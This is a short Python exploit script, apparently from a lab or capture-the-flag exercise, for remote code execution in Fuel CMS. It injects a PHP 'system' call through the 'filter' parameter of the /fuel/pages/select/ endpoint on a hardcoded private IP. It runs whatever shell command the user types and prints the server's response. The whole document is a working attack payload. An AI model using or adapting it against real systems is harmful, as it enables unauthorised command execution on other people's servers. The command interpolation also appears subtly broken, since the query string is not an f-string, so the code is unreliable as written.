import requests

url = "http://10.65.129.102"

cmd = input("cmd? ")

try:
    r = requests.get(url)

    if r.status_code == 200:
        print("[+] Connecting...")
    else:
        print(f"[-] Unexpected status code: {r.status_code}")

except requests.exceptions.RequestException as e:
    print("[-] Connection failed:", e)
    exit()

main_url = (
    f"{url}/fuel/pages/select/"
    "?filter='%2bpi(print(%24a%3d'system'))%2b%24a('{cmd}')%2b'"
)

r = requests.get(main_url)

output = r.text.split(
    '<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">',
    maxsplit=10
)

print(output)
